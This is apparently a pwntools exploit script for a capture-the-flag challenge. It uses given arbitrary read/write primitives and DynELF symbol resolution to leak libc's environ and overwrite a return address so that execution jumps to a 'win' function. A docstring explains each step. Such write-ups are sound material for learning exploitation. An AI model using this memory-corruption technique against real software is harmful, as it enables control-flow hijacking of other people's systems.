#!/usr/bin/python
#coding=utf-8
 
from pwn import *


"""
We are given r/w functions, and a random pointer into libwin.so, which
contains a win function at a random address that we must call.

The easiest way to use this is to use pwntools DynELF class to first
dynamically resolve the address of win, then resolve the base address
of libc. Now we can use that leak to resolve `environ` in libc to give us
a stack leak. Simply writing the address of win to the stack causes an
alignment issue, so we first write the address of the function we are
originally provided, then win.


At a high level, this dynamic resolution can be achieved like so:

    1. Read down page boundaries from the leak until we find the ELF
    magic bytes.
    2. Read through ELF headers to find the .symtab and .strtab sections
    3. Iterate over the .symtab entries. Each symbol has an st_name field, 
    which can be used to index into the .strtab to compare against the symbol
    you are resolving.
    4. The st_value for the corresponding symbol will be the relative
    address of the resolved symbol in the binary.

Check out the pwntools source for more details!

"""





if len(sys.argv) > 2:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
elif len(sys.argv) == 2:
    is_remote = False
    p = process(sys.argv[1])
else:
    print("Please provide host and port")
    exit()
 
rl      = lambda                    :p.recvline()
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, b'\0'))
uu64    = lambda data               :u64(data.ljust(8, b'\0'))


ru("have this:")
leak = int(rl().split()[-1], 16)
print(leak)
info(f"leak: {hex(leak)}")

def read(addr):
    sla(">", "1")
    sla("address:", str(addr))
    return p64(int(rl().split()[-1], 16))

def write(addr, value):
    sla(">", "2")
    sla("address:", str(addr))
    sla("value:", str(value))


x = read(leak)

libwin_resolver = DynELF(read,leak)
libwin_base = libwin_resolver.lookup()
win = libwin_resolver.lookup("win")
libc_probably = libwin_resolver.lookup(None, "libc")
libc_resolver = DynELF(read,libc_probably)
libc_base = libc_resolver.lookup()
environ = libc_resolver.lookup("environ")
stack_leak = u64(read(environ))
ret = leak
info(f"stack leak: {hex(stack_leak)}")
target = stack_leak - 0x120

write(target, ret)
write(target+ 8, win)

sla(">", "4")

p.interactive()
